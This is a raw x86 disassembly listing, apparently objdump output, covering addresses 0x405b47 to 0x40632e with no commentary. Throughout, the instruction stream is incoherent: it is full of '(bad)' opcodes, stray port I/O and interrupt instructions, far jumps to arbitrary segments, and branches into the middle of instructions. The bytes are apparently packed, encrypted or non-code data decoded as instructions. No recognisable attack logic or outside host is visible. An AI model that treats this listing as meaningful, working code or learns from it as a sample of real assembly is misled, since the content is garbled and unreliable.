  405b47:	mov    ebx,0x516276f7
  405b4c:	cli    
  405b4d:	shr    BYTE PTR [edx-0x80],0x46
  405b51:	jp     0x405af9
  405b53:	cli    
  405b54:	scas   eax,DWORD PTR es:[edi]
  405b55:	je     0x405b28
  405b57:	xchg   BYTE PTR [eax],cl
  405b59:	mov    ecx,eax
  405b5b:	stos   DWORD PTR es:[edi],eax
  405b5c:	dec    ecx
  405b5d:	inc    edi
  405b5e:	loop   0x405b83
  405b60:	pop    eax
  405b61:	xchg   esi,eax
  405b62:	cwde   
  405b63:	hlt    
  405b64:	inc    eax
  405b65:	add    al,0x41
  405b67:	lea    ebx,[edx*8-0x4554fd5c]
  405b6e:	xchg   ecx,eax
  405b6f:	xor    DWORD PTR [ebp+ecx*4+0x249a47d3],ebx
  405b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b77:	pop    edi
  405b78:	daa    
  405b79:	mov    al,0x14
  405b7b:	sub    dh,bh
  405b7d:	loopne 0x405b42
  405b7f:	adc    al,0x96
  405b81:	call   0x1207592d
  405b86:	or     eax,0x4a27fa25
  405b8b:	push   esi
  405b8c:	cdq    
  405b8d:	or     esi,DWORD PTR ds:0x2c9f2556
  405b93:	jnp    0x405b81
  405b95:	stos   DWORD PTR es:[edi],eax
  405b96:	cmp    ecx,DWORD PTR [edx]
  405b98:	push   ebp
  405b99:	xor    al,0x94
  405b9b:	mov    ecx,0x7b4d08d
  405ba0:	push   ss
  405ba1:	xor    al,0xaf
  405ba3:	push   esi
  405ba4:	push   es
  405ba5:	jg     0x405c20
  405ba7:	pop    ebp
  405ba8:	mov    WORD PTR [edi-0x6508b0c4],?
  405bae:	fs cli 
  405bb0:	scas   eax,DWORD PTR es:[edi]
  405bb1:	shr    BYTE PTR [edx],cl
  405bb3:	push   esi
  405bb4:	jg     0x405bcb
  405bb6:	fistp  DWORD PTR [edx]
  405bb8:	out    0x13,eax
  405bba:	mov    ah,0x44
  405bbc:	test   al,0x56
  405bbe:	jg     0x405b76
  405bc0:	out    dx,al
  405bc1:	pop    ds
  405bc2:	call   0x82ad47f
  405bc7:	cmp    al,0xd5
  405bc9:	inc    ebp
  405bca:	std    
  405bcb:	lahf   
  405bcc:	jle    0x405c23
  405bce:	sbb    esp,eax
  405bd0:	lods   al,BYTE PTR ds:[esi]
  405bd1:	or     dl,BYTE PTR [esi+ebp*4]
  405bd4:	sar    BYTE PTR cs:[edx],0x2b
  405bd8:	in     al,dx
  405bd9:	ss push cs
  405bdb:	pushf  
  405bdc:	cmp    esi,DWORD PTR [ebx-0x10]
  405bdf:	rol    eax,0xbf
  405be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405be3:	stos   BYTE PTR es:[edi],al
  405be4:	mov    al,0x1c
  405be6:	jg     0x405c2c
  405be8:	xchg   DWORD PTR [esi-0x19],edx
  405beb:	aas    
  405bec:	or     dl,BYTE PTR [ecx+0x654bf77b]
  405bf2:	pushf  
  405bf3:	inc    eax
  405bf4:	aaa    
  405bf5:	(bad)  
  405bf7:	jne    0x405b79
  405bf9:	aas    
  405bfa:	lahf   
  405bfb:	push   ds
  405bfc:	add    ah,bh
  405bfe:	imul   edi,esp,0xd53737b1
  405c04:	out    dx,al
  405c05:	das    
  405c06:	jp     0x405b8b
  405c08:	cmp    esi,DWORD PTR [ebx+0x73065415]
  405c0e:	push   eax
  405c0f:	mov    eax,0xde018074
  405c14:	xor    edi,DWORD PTR [ebp-0x77]
  405c17:	push   esi
  405c18:	rol    edx,1
  405c1a:	popfw  
  405c1c:	outs   dx,DWORD PTR cs:[esi]
  405c1e:	push   0x1a
  405c20:	lods   eax,DWORD PTR ds:[esi]
  405c21:	push   0xdd2b33d3
  405c26:	fadd   st(2),st
  405c28:	mov    esi,0x74c32243
  405c2d:	ret    0xf31
  405c30:	out    0x25,ax
  405c33:	fstp   TBYTE PTR [ecx+0x1d]
  405c36:	xor    cl,BYTE PTR [eax]
  405c38:	(bad)  
  405c39:	enter  0xfbe5,0xb4
  405c3d:	push   esp
  405c3e:	outs   dx,DWORD PTR ds:[esi]
  405c3f:	mov    ch,0x61
  405c41:	int    0x83
  405c43:	inc    ebx
  405c44:	popf   
  405c45:	mov    bh,0xa5
  405c47:	push   es
  405c48:	mov    ds:0x32e3491c,eax
  405c4d:	loope  0x405c67
  405c4f:	push   ecx
  405c50:	mov    esi,0x46a6fd9
  405c55:	adc    ch,al
  405c57:	adc    al,0x65
  405c59:	int3   
  405c5a:	ds jo  0x405c13
  405c5d:	cdq    
  405c5e:	push   ebp
  405c5f:	jne    0x405c14
  405c61:	ins    DWORD PTR es:[edi],dx
  405c62:	test   BYTE PTR ds:0x31787df0,bl
  405c68:	pop    ebx
  405c69:	lahf   
  405c6a:	loop   0x405c6d
  405c6c:	mov    al,0x90
  405c6e:	popa   
  405c6f:	pop    esp
  405c70:	sub    al,0xa9
  405c72:	iret   
  405c73:	and    ah,BYTE PTR gs:[ebx-0x14a77e81]
  405c7a:	dec    eax
  405c7b:	mov    ebp,0xc832257
  405c80:	out    dx,al
  405c81:	adc    bh,BYTE PTR [ebp-0x24f66d7f]
  405c87:	jo     0x405c30
  405c89:	add    DWORD PTR [edx+0xc995c83],esi
  405c8f:	push   esp
  405c90:	imul   edx,DWORD PTR [ecx+0x4441dacc],0xe185980e
  405c9a:	inc    ebx
  405c9b:	cmp    cl,BYTE PTR ds:0x8aa4439e
  405ca1:	rcl    dh,0xae
  405ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca5:	cmp    DWORD PTR [edi+0x15a72043],ecx
  405cab:	inc    edi
  405cac:	jne    0x405cde
  405cae:	push   edi
  405caf:	jle    0x405c3e
  405cb1:	data16 (bad) 
  405cb3:	enter  0x2990,0xfb
  405cb7:	sbb    al,0x6b
  405cb9:	mov    ds:0x58b0caf9,eax
  405cbe:	sbb    dl,BYTE PTR [esi+0xd]
  405cc1:	xchg   edi,eax
  405cc2:	pop    ebp
  405cc3:	sub    BYTE PTR [eax+esi*2+0x27],dh
  405cc7:	sbb    bl,bh
  405cc9:	lds    esp,FWORD PTR [esp+0x70]
  405ccd:	add    eax,0x50a00679
  405cd2:	outs   dx,BYTE PTR ds:[esi]
  405cd3:	inc    esi
  405cd4:	cmp    DWORD PTR [ebx],esi
  405cd6:	mov    ecx,0xf9cbefeb
  405cdb:	les    ebx,FWORD PTR [edx+0x5a]
  405cde:	addr16 pop ebp
  405ce0:	adc    bl,BYTE PTR [eax-0x3f67c17d]
  405ce6:	push   ebx
  405ce7:	loopne 0x405c88
  405ce9:	and    ebp,eax
  405ceb:	inc    edx
  405cec:	cmp    DWORD PTR [ebp-0x736fe537],edx
  405cf2:	das    
  405cf3:	call   0x317b:0xc9f95875
  405cfa:	mov    eax,0x649633dc
  405cff:	mov    ds:0xa39b1ed8,al
  405d04:	xchg   ch,dl
  405d06:	test   al,0xbd
  405d08:	xchg   ebx,eax
  405d09:	mov    DWORD PTR [edi+0x62],eax
  405d0c:	out    0xda,al
  405d0e:	iret   
  405d0f:	push   esi
  405d10:	rcl    DWORD PTR [ebp+0x46c34b65],0x36
  405d17:	aam    0xe1
  405d19:	stos   DWORD PTR es:[edi],eax
  405d1a:	jge    0x405d55
  405d1c:	gs mov ch,0xc4
  405d1f:	xchg   dh,al
  405d21:	stos   BYTE PTR es:[edi],al
  405d22:	push   edi
  405d23:	inc    eax
  405d24:	sub    eax,0x59530d73
  405d29:	inc    ecx
  405d2a:	aad    0x5d
  405d2c:	pop    eax
  405d2d:	cdq    
  405d2e:	lea    ecx,[eax-0x1c]
  405d31:	(bad)  
  405d32:	retf   0x6487
  405d35:	out    dx,eax
  405d36:	dec    edx
  405d37:	mov    ds:0xefc76bdf,eax
  405d3c:	fadd   DWORD PTR [ecx-0x78]
  405d3f:	sub    BYTE PTR [ebx],ah
  405d41:	es pop ebp
  405d43:	das    
  405d44:	data16 jg 0x405d90
  405d47:	call   0x7854:0x3dd6eebb
  405d4e:	fcmovb st,st(5)
  405d50:	and    al,BYTE PTR [eax-0x6b]
  405d53:	or     ebx,esi
  405d55:	lds    ebx,FWORD PTR [ecx-0x63830529]
  405d5b:	or     DWORD PTR [ecx+0x4c47580e],0xffffffed
  405d62:	inc    esi
  405d63:	test   eax,0x54c5731a
  405d68:	push   cs
  405d69:	add    edi,DWORD PTR [edx+0x38217813]
  405d6f:	ins    DWORD PTR es:[edi],dx
  405d70:	jg     0x405db2
  405d72:	test   BYTE PTR [ebx],al
  405d74:	jb     0x405d4f
  405d76:	adc    dh,cl
  405d78:	xor    cl,BYTE PTR [eax+0x1f]
  405d7b:	(bad)  
  405d7c:	fcomp  DWORD PTR [esi+eax*1]
  405d7f:	stos   BYTE PTR es:[edi],al
  405d80:	inc    edx
  405d81:	add    BYTE PTR [edx+edx*2-0x42],al
  405d85:	stc    
  405d86:	call   0x3e1bc16f
  405d8b:	jl     0x405def
  405d8d:	inc    ebp
  405d8e:	ret    0x9cbe
  405d91:	and    BYTE PTR fs:[edi+edi*1-0x38],bh
  405d96:	pop    esp
  405d97:	sub    esp,esp
  405d99:	mov    bh,BYTE PTR [edx]
  405d9b:	adc    dl,BYTE PTR [edi+0x30a32bb8]
  405da1:	das    
  405da2:	or     eax,0xb4d8d4df
  405da7:	imul   ecx,DWORD PTR [edx],0xffffffe7
  405daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dab:	out    dx,eax
  405dac:	daa    
  405dad:	fdivr  DWORD PTR [ecx+edx*2+0x6a]
  405db1:	jmp    0xdc65:0x3a01386d
  405db8:	cmp    eax,0x49b77c53
  405dbd:	repnz ds xor edi,eax
  405dc1:	xchg   ebp,ebp
  405dc3:	test   al,0xb4
  405dc5:	lods   eax,DWORD PTR ds:[esi]
  405dc6:	jo     0x405e3e
  405dc8:	shl    DWORD PTR [eax],cl
  405dca:	jnp    0x405df5
  405dcc:	aaa    
  405dcd:	jecxz  0x405de1
  405dcf:	add    BYTE PTR [eax],dl
  405dd1:	lods   al,BYTE PTR ds:[esi]
  405dd2:	(bad)  [edx+0xee52ff8]
  405dd8:	jecxz  0x405da9
  405dda:	test   al,0xbc
  405ddc:	ja     0x405e3f
  405dde:	add    bl,cl
  405de0:	push   0x30e8c2b1
  405de5:	dec    eax
  405de6:	push   ecx
  405de7:	pushf  
  405de8:	scas   al,BYTE PTR es:[edi]
  405de9:	aam    0xf7
  405deb:	cmc    
  405dec:	adc    dl,BYTE PTR [esi-0x6f3965b4]
  405df2:	push   es
  405df3:	int    0xdf
  405df5:	sub    bl,bh
  405df7:	imul   esp,DWORD PTR [eax+0x76372963],0x602da09a
  405e01:	aad    0x28
  405e03:	jnp    0x405e83
  405e05:	fimul  WORD PTR [edi]
  405e07:	xor    edi,edi
  405e09:	fsub   QWORD PTR [bx]
  405e0c:	jg     0x405e0b
  405e0e:	mov    fs,WORD PTR [ebx-0x10]
  405e11:	retf   
  405e12:	xor    al,BYTE PTR [esi+0x7]
  405e15:	mov    ah,0xdc
  405e17:	xor    DWORD PTR [edi-0x50d9338],0xf5b81c0
  405e21:	mov    ebx,DWORD PTR [esp+eiz*8-0x128f11dd]
  405e28:	and    ebx,eax
  405e2a:	ins    BYTE PTR es:[edi],dx
  405e2b:	rcl    BYTE PTR [ebx+0x33],1
  405e2e:	dec    edx
  405e2f:	or     BYTE PTR ds:0x2c7bc71,ah
  405e35:	stos   DWORD PTR es:[edi],eax
  405e36:	adc    ah,BYTE PTR [edi+0x3bda49e6]
  405e3c:	mov    dl,0xd9
  405e3e:	lock pop ebx
  405e40:	or     BYTE PTR [ebp-0x45d8e086],bl
  405e46:	push   0xffffffe5
  405e48:	cs push ds
  405e4a:	fst    QWORD PTR [esi-0x5c8eebc]
  405e50:	pop    edi
  405e51:	dec    ebp
  405e52:	nop
  405e53:	jge    0x405e35
  405e55:	pop    ebp
  405e56:	xchg   ecx,eax
  405e57:	sub    al,0x6a
  405e59:	xor    esi,ebp
  405e5b:	hlt    
  405e5c:	outs   dx,BYTE PTR ds:[esi]
  405e5d:	and    BYTE PTR [eax+ecx*4-0x24eab9b1],bl
  405e64:	xlat   BYTE PTR ds:[ebx]
  405e65:	in     al,dx
  405e66:	mov    cl,0xe9
  405e68:	outs   dx,DWORD PTR ds:[esi]
  405e69:	aaa    
  405e6a:	aam    0xe6
  405e6c:	call   0x6cb3b540
  405e71:	test   DWORD PTR [ecx+0x565438c3],eax
  405e77:	and    eax,0x17da5e14
  405e7c:	jnp    0x405e2d
  405e7e:	or     BYTE PTR [ebp+0x2bcc3c42],0x7
  405e85:	dec    esp
  405e86:	sub    DWORD PTR [esp+ebp*2-0x28],ecx
  405e8a:	adc    eax,0x50affd43
  405e8f:	jmp    0xf74e:0xe3b86b12
  405e96:	jg     0x405e33
  405e98:	pop    ebp
  405e99:	sbb    BYTE PTR ds:0xb493e291,ah
  405e9f:	jne    0x405e70
  405ea1:	cmc    
  405ea2:	push   edi
  405ea3:	jb     0x405ec6
  405ea5:	xchg   edi,eax
  405ea6:	cmp    al,0xaa
  405ea8:	out    dx,eax
  405ea9:	xchg   esp,eax
  405eaa:	jmp    0x1bb7:0x3efae8b2
  405eb1:	cmp    eax,0x1a3f8f28
  405eb6:	mov    ebx,DWORD PTR [edi]
  405eb8:	pop    eax
  405eb9:	dec    ecx
  405eba:	imul   edx,edx,0xde72fa83
  405ec0:	mov    ecx,0x94df4e18
  405ec5:	scas   eax,DWORD PTR es:[edi]
  405ec6:	sub    edx,esp
  405ec8:	dec    ebx
  405ec9:	add    eax,0xb7d5efc4
  405ece:	out    dx,al
  405ecf:	cmp    ah,BYTE PTR [ebp-0x61924a98]
  405ed5:	aaa    
  405ed6:	jnp    0x405f57
  405ed8:	push   0x44
  405eda:	(bad)  
  405edb:	scas   eax,DWORD PTR es:[edi]
  405edc:	and    ah,BYTE PTR [edi+ebx*4+0x37c79917]
  405ee3:	mov    ebp,0x119a1492
  405ee8:	push   0xf0311744
  405eed:	enter  0xb60,0xce
  405ef1:	dec    ebp
  405ef2:	gs rol esp,1
  405ef5:	jmp    0x405ebc
  405ef7:	ror    ch,1
  405ef9:	adc    al,ch
  405efb:	xchg   DWORD PTR [ebx-0x6b],ecx
  405efe:	dec    BYTE PTR [esi-0x751dc1b0]
  405f04:	xchg   ebx,eax
  405f05:	sub    eax,0x2a5f4553
  405f0a:	stc    
  405f0b:	int3   
  405f0c:	add    eax,0x6abaac69
  405f11:	ins    BYTE PTR es:[edi],dx
  405f12:	inc    esp
  405f13:	daa    
  405f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f15:	cdq    
  405f16:	mov    gs,WORD PTR ds:0x1b6e3c3a
  405f1c:	arpl   WORD PTR [ecx-0x28170a44],ax
  405f22:	sbb    ah,BYTE PTR [edx+0x6a30c664]
  405f28:	icebp  
  405f29:	std    
  405f2a:	cwde   
  405f2b:	mov    ebp,0xed546c0b
  405f30:	test   al,0x1a
  405f32:	mov    esi,0x3daaa15
  405f37:	sbb    DWORD PTR [ebx-0x7e],esp
  405f3a:	stos   DWORD PTR es:[edi],eax
  405f3b:	jl     0x405fae
  405f3d:	fnsave [eax+0x14]
  405f40:	std    
  405f41:	jmp    0x405f6d
  405f43:	adc    esi,esp
  405f45:	loop   0x405faa
  405f47:	cmp    DWORD PTR [ecx+ebp*8],ebx
  405f4a:	xor    edi,ebp
  405f4c:	jmp    0x405ed8
  405f4e:	loope  0x405f24
  405f50:	scas   al,BYTE PTR es:[edi]
  405f51:	into   
  405f52:	imul   ebx,DWORD PTR [edi],0x51c9ea02
  405f58:	add    esi,DWORD PTR [ebx-0x23]
  405f5b:	or     ebp,DWORD PTR [ecx+0x7b]
  405f5e:	fcom   st(2)
  405f60:	mov    al,ds:0x650e85a7
  405f65:	pop    ebx
  405f66:	push   edx
  405f67:	mov    BYTE PTR [edi],cl
  405f69:	xchg   esp,eax
  405f6a:	fs mov esi,0x7694aac5
  405f70:	hlt    
  405f71:	daa    
  405f72:	gs dec esp
  405f74:	mov    gs,ebx
  405f76:	push   eax
  405f77:	cmc    
  405f78:	retf   
  405f79:	rcl    BYTE PTR [ebp+0x4],1
  405f7c:	es cmc 
  405f7e:	in     al,dx
  405f7f:	aas    
  405f80:	push   0x1a22487c
  405f85:	imul   esp,DWORD PTR [edx-0x5a],0x6b681f4b
  405f8c:	inc    esp
  405f8d:	adc    eax,0xdda55a82
  405f92:	out    0xfa,eax
  405f94:	push   es
  405f95:	mov    ah,0xa0
  405f97:	xchg   esi,eax
  405f98:	pop    edi
  405f99:	int3   
  405f9a:	icebp  
  405f9b:	ds popw ds
  405f9e:	adc    al,0x88
  405fa0:	pop    edi
  405fa1:	mov    ch,0x57
  405fa3:	inc    esi
  405fa4:	xchg   esi,eax
  405fa5:	shl    BYTE PTR [esi],0xe9
  405fa8:	repz mov dl,0x90
  405fab:	xor    DWORD PTR [ecx+0x79f7550f],esi
  405fb1:	xchg   BYTE PTR [edi-0x19084658],ch
  405fb7:	adc    DWORD PTR [ebx],0x3c
  405fba:	add    edi,eax
  405fbc:	sbb    dh,BYTE PTR [ebx+edx*8-0x5d495061]
  405fc3:	jo     0x405f7c
  405fc5:	pusha  
  405fc6:	add    eax,0x5c3833ff
  405fcb:	sbb    BYTE PTR [bp+di+0x75],dh
  405fcf:	dec    ebp
  405fd0:	push   ds
  405fd1:	jl     0x405f9c
  405fd3:	xchg   DWORD PTR [edx],eax
  405fd5:	popa   
  405fd6:	mov    BYTE PTR [ebx-0x4167bfd7],cl
  405fdc:	into   
  405fdd:	into   
  405fde:	sahf   
  405fdf:	mov    esi,0x95dcdbda
  405fe4:	sbb    DWORD PTR [eax+ebp*4+0x9df6049],ebp
  405feb:	sar    DWORD PTR [eax+0x78],1
  405fee:	lds    eax,FWORD PTR ds:0xdcf0c10f
  405ff4:	jnp    0x405fb3
  405ff6:	xor    edi,DWORD PTR [ecx]
  405ff8:	dec    ebx
  405ff9:	es jecxz 0x405fba
  405ffc:	dec    esp
  405ffd:	or     DWORD PTR ss:[ecx],eax
  406000:	push   esp
  406001:	mov    edi,0x1d0740cd
  406006:	sbb    eax,0xcd7a6eb1
  40600b:	shl    BYTE PTR ds:0xc2447846,1
  406011:	push   esp
  406012:	or     al,0xf8
  406014:	inc    ebx
  406015:	sub    al,0xe4
  406017:	addr16 push ebx
  406019:	jno    0x405fc6
  40601b:	push   ebx
  40601c:	rol    DWORD PTR [edx],cl
  40601e:	arpl   WORD PTR [edx],bp
  406020:	cmp    eax,0x4898d35c
  406025:	jg     0x405fd1
  406027:	mov    bl,0xbc
  406029:	sub    bh,ch
  40602b:	or     al,BYTE PTR [edx-0x11]
  40602e:	ins    DWORD PTR es:[edi],dx
  40602f:	mov    ?,WORD PTR [eax]
  406031:	int    0x3f
  406033:	(bad)  
  406034:	(bad)  
  406035:	out    0xb1,eax
  406037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406038:	and    BYTE PTR [eax-0x51],dh
  40603b:	jmp    0xa26e2459
  406040:	sbb    cl,bl
  406042:	mov    WORD PTR [edi-0x4711a8db],es
  406048:	mov    edi,0xbcfd8950
  40604d:	ret    
  40604e:	cwde   
  40604f:	out    dx,al
  406050:	mov    eax,0x8e0f474e
  406055:	call   0x716aa90a
  40605a:	fimul  WORD PTR [ebx+0x65ac2c9a]
  406060:	rcr    DWORD PTR [edi-0x3d31454],cl
  406066:	nop
  406067:	dec    esp
  406068:	xchg   DWORD PTR [esp+ebp*4+0x43],edi
  40606c:	fcos   
  40606e:	loopne 0x4060a7
  406070:	mov    eax,ds:0xed251fb
  406075:	adc    eax,ebx
  406077:	pop    ecx
  406078:	jmp    0xdf36:0xa6b64357
  40607f:	ret    0x15b4
  406082:	dec    edx
  406083:	inc    BYTE PTR [ecx+ebx*4-0x1262d812]
  40608a:	cli    
  40608b:	call   0x6042:0xe7759f2
  406092:	dec    edx
  406093:	mov    DWORD PTR [ebx-0xde55f30],ebx
  406099:	bound  esi,QWORD PTR [ebp-0x1f]
  40609c:	in     al,dx
  40609d:	mov    cl,0x19
  40609f:	fwait
  4060a0:	int3   
  4060a1:	fdivr  DWORD PTR [esi]
  4060a3:	mov    esp,0xa2bd4cdd
  4060a8:	aad    0xc4
  4060aa:	popa   
  4060ab:	stos   DWORD PTR es:[edi],eax
  4060ac:	lds    esi,FWORD PTR [esi]
  4060ae:	call   0xfb0b217e
  4060b3:	bound  eax,QWORD PTR [ecx-0x76e3c7a0]
  4060b9:	push   ebp
  4060ba:	jnp    0x40605a
  4060bc:	test   edx,edx
  4060be:	adc    ebp,DWORD PTR [ecx]
  4060c0:	mov    ebx,0xac8c0410
  4060c5:	pop    edi
  4060c6:	scas   al,BYTE PTR es:[edi]
  4060c7:	jp     0x40609a
  4060c9:	push   0x40
  4060cb:	add    BYTE PTR [ebp+eax*4-0x62132366],ch
  4060d2:	or     esp,DWORD PTR [ebp+0x37]
  4060d5:	sar    DWORD PTR [ebx-0x6945849b],cl
  4060db:	aas    
  4060dc:	adc    eax,0xc6789bc2
  4060e1:	loop   0x40612c
  4060e3:	dec    esp
  4060e4:	aad    0x2c
  4060e6:	and    al,0xbd
  4060e8:	retf   0x468
  4060eb:	pop    ebx
  4060ec:	mov    eax,ds:0x3b16f61a
  4060f1:	loop   0x406133
  4060f3:	xchg   edi,eax
  4060f4:	sub    eax,0x386bcebc
  4060f9:	mov    BYTE PTR [edi],ch
  4060fb:	push   esp
  4060fc:	popf   
  4060fd:	jae    0x406108
  4060ff:	sub    DWORD PTR [eax-0x26f21590],esp
  406105:	rol    BYTE PTR [ebx+0x75],0x7d
  406109:	push   ss
  40610a:	xchg   BYTE PTR [edx+0x17c6425e],ch
  406110:	mov    gs:0x65cff7d,al
  406116:	(bad)  
  406117:	xor    al,0x5f
  406119:	pop    ebx
  40611a:	dec    ecx
  40611b:	lea    ebp,[eax-0x71728679]
  406121:	das    
  406122:	fwait
  406123:	push   ebp
  406124:	cmp    DWORD PTR [eax+0x27c8dc33],ebp
  40612a:	cmp    ah,BYTE PTR [ecx-0x7900f60f]
  406130:	adc    bh,cl
  406132:	ja     0x406157
  406134:	ja     0x4060ff
  406136:	jmp    0x57b8:0x2c954cdc
  40613d:	jecxz  0x4060c9
  40613f:	sub    eax,eax
  406141:	lods   eax,DWORD PTR ds:[esi]
  406142:	rcr    BYTE PTR [eax+0x349941a7],1
  406148:	or     ch,bl
  40614a:	imul   ecx,DWORD PTR [ecx-0x76],0x87ccfd8e
  406151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406152:	or     ah,BYTE PTR [eiz*4-0x3064ad20]
  406159:	rol    BYTE PTR [edx-0x1e],cl
  40615c:	dec    esi
  40615d:	push   ds
  40615e:	scas   eax,DWORD PTR es:[edi]
  40615f:	js     0x40611a
  406161:	ins    BYTE PTR es:[edi],dx
  406162:	mov    esi,DWORD PTR [esi+0x49]
  406165:	mov    esi,0x9a89f2df
  40616a:	idiv   DWORD PTR [ebp+0x19]
  40616d:	adc    DWORD PTR [edx-0x7a42c06c],ebx
  406173:	push   cs
  406174:	(bad)  
  406175:	and    al,0x80
  406177:	and    eax,ebx
  406179:	lods   al,BYTE PTR ds:[esi]
  40617a:	fnstenv [ebx+0x56]
  40617d:	xlat   BYTE PTR ds:[ebx]
  40617e:	mov    edi,0xfa964ba5
  406183:	lods   eax,DWORD PTR ds:[esi]
  406184:	(bad)  
  406185:	mov    ch,0x43
  406187:	mov    edx,0xe3d46808
  40618c:	xor    ah,BYTE PTR [ebp+0x7623cf6]
  406192:	and    eax,0xa9d7db90
  406197:	mov    al,ds:0x2785bd69
  40619c:	into   
  40619d:	jecxz  0x406151
  40619f:	or     eax,0x23d7a136
  4061a4:	pop    ss
  4061a5:	pop    edi
  4061a6:	aaa    
  4061a7:	or     BYTE PTR [edi],ch
  4061a9:	cli    
  4061aa:	in     eax,0x9e
  4061ac:	lds    eax,FWORD PTR [ebx+0x5]
  4061af:	inc    esp
  4061b0:	inc    eax
  4061b1:	aaa    
  4061b2:	xchg   BYTE PTR [edx],dl
  4061b4:	fcmovb st,st(2)
  4061b6:	adc    al,0x52
  4061b8:	dec    ebx
  4061b9:	sbb    esp,DWORD PTR [ecx+0x1e]
  4061bc:	cmp    al,0x7a
  4061be:	cmc    
  4061bf:	mov    ds:0xdbe5bdfd,al
  4061c4:	clc    
  4061c5:	jl     0x40623b
  4061c7:	dec    edi
  4061c8:	jecxz  0x406229
  4061ca:	pop    ebx
  4061cb:	jg     0x406181
  4061cd:	shr    BYTE PTR [edx-0x46],0x78
  4061d1:	and    ebx,DWORD PTR [ebx+0x45ce1926]
  4061d7:	(bad)  
  4061d8:	stc    
  4061d9:	adc    ch,BYTE PTR [ebx]
  4061db:	test   DWORD PTR [ebp+0x1b],ebx
  4061de:	rcl    DWORD PTR [esi],cl
  4061e0:	sub    dh,dl
  4061e2:	je     0x4061ec
  4061e4:	clc    
  4061e5:	xor    esi,DWORD PTR [ebx+0x64238c25]
  4061eb:	xchg   DWORD PTR [edx],ebp
  4061ed:	mov    WORD PTR [edi],?
  4061ef:	dec    esp
  4061f0:	sbb    eax,0x21457b7e
  4061f5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4061f7:	int    0x3c
  4061f9:	fdivr  DWORD PTR [ecx-0x3d]
  4061fc:	mov    eax,0x9952ad71
  406201:	adc    eax,0x392a27dc
  406206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406207:	pop    ebp
  406208:	ret    
  406209:	pop    ecx
  40620a:	push   0xabed1ce9
  40620f:	dec    ebx
  406210:	icebp  
  406211:	aas    
  406212:	mov    esp,0xdf7fd09c
  406217:	push   ss
  406218:	xor    ch,al
  40621a:	inc    ebp
  40621b:	xchg   ecx,eax
  40621c:	cdq    
  40621d:	das    
  40621e:	js     0x406200
  406220:	sub    BYTE PTR [esi],dh
  406222:	lock or DWORD PTR [edx+eiz*4],edx
  406226:	fisttp DWORD PTR [ebp+0x74]
  406229:	clc    
  40622a:	cmp    eax,0xe27466
  40622f:	dec    eax
  406230:	sub    ecx,DWORD PTR [ebx]
  406232:	dec    ebp
  406233:	in     eax,0xab
  406235:	mov    edi,ecx
  406237:	rcr    BYTE PTR [ebx],cl
  406239:	xchg   ecx,eax
  40623a:	sbb    esp,DWORD PTR [eax]
  40623c:	loopne 0x406202
  40623e:	stos   BYTE PTR es:[edi],al
  40623f:	and    DWORD PTR [ebp+eiz*1-0x54],eax
  406243:	not    BYTE PTR [ebx+eax*4]
  406246:	xlat   BYTE PTR ds:[ebx]
  406247:	or     DWORD PTR [esi-0x2e],eax
  40624a:	add    al,0x20
  40624c:	pushf  
  40624d:	push   0x4b
  40624f:	cmp    eax,0x46fab13
  406254:	sub    ch,BYTE PTR [esi+0xc6c46b9]
  40625a:	jmp    0x406295
  40625c:	lahf   
  40625d:	(bad)  
  40625e:	xchg   ebx,eax
  40625f:	addr16 lock and eax,0xfbc2fb5d
  406266:	call   0x61a1:0x511f5ebc
  40626d:	mov    esi,0xeb618a0c
  406272:	rol    ah,cl
  406274:	in     eax,0x62
  406276:	jl     0x4062cf
  406278:	mov    BYTE PTR [ebp+esi*2-0x4b6c66dd],0xaa
  406280:	fiadd  WORD PTR [ebx-0x3d22d584]
  406286:	fbld   TBYTE PTR [ebx-0x18f083cc]
  40628c:	adc    eax,0x6e0b70fa
  406291:	and    eax,0x42175dd3
  406296:	outs   dx,BYTE PTR ds:[esi]
  406297:	addr16 adc eax,0x8511c01d
  40629d:	mov    edi,0xa57cbed5
  4062a2:	and    edx,DWORD PTR ds:[ecx+0x49]
  4062a6:	stc    
  4062a7:	mov    bl,0x31
  4062a9:	sbb    eax,0x79a1b5c3
  4062ae:	xor    edx,edi
  4062b0:	adc    al,0x8
  4062b2:	int    0xe5
  4062b4:	sbb    BYTE PTR [ebx],al
  4062b6:	rcl    DWORD PTR [esi],0x24
  4062b9:	pop    eax
  4062ba:	dec    ecx
  4062bb:	sub    DWORD PTR [edi+0x68265a53],ebx
  4062c1:	and    ebx,esi
  4062c3:	xchg   ebp,eax
  4062c4:	mov    esp,0x63fa9c4b
  4062c9:	inc    ebp
  4062ca:	cli    
  4062cb:	dec    ebp
  4062cc:	xor    eax,0xd6f106ea
  4062d1:	pop    ecx
  4062d2:	imul   ecx,DWORD PTR [edx-0x52a05c0c],0x50
  4062d9:	jle    0x406329
  4062db:	in     eax,dx
  4062dc:	push   edx
  4062dd:	or     bl,ch
  4062df:	out    0x8d,eax
  4062e1:	or     DWORD PTR [ecx+0x66],0x66
  4062e5:	jo     0x4062b8
  4062e7:	pop    ss
  4062e8:	mov    ebx,0xead93537
  4062ed:	arpl   WORD PTR [eax-0x79],di
  4062f0:	in     al,dx
  4062f1:	(bad)  
  4062f2:	in     al,0xa6
  4062f4:	xchg   DWORD PTR [ebx-0x5c6c0594],edi
  4062fa:	mov    dl,0x66
  4062fc:	add    al,0x5d
  4062fe:	pusha  
  4062ff:	aad    0x45
  406301:	out    dx,eax
  406302:	imul   BYTE PTR [edi-0x7e708b89]
  406308:	and    edx,esi
  40630a:	jle    0x406359
  40630c:	xchg   esp,edx
  40630e:	js     0x406315
  406310:	test   DWORD PTR [eax],esi
  406312:	js     0x406391
  406314:	xor    BYTE PTR [eax],ch
  406316:	adc    cl,BYTE PTR [esi]
  406318:	cmp    ecx,ebx
  40631a:	or     DWORD PTR [eax+ebp*1+0x3a315700],esi
  406321:	cli    
  406322:	mov    ah,0x71
  406324:	pushf  
  406325:	scas   al,BYTE PTR es:[edi]
  406326:	int    0x21
  406328:	shl    edi,0xf0
  40632b:	jb     0x40635a
  40632d:	cmc    
  40632e:	push   cs
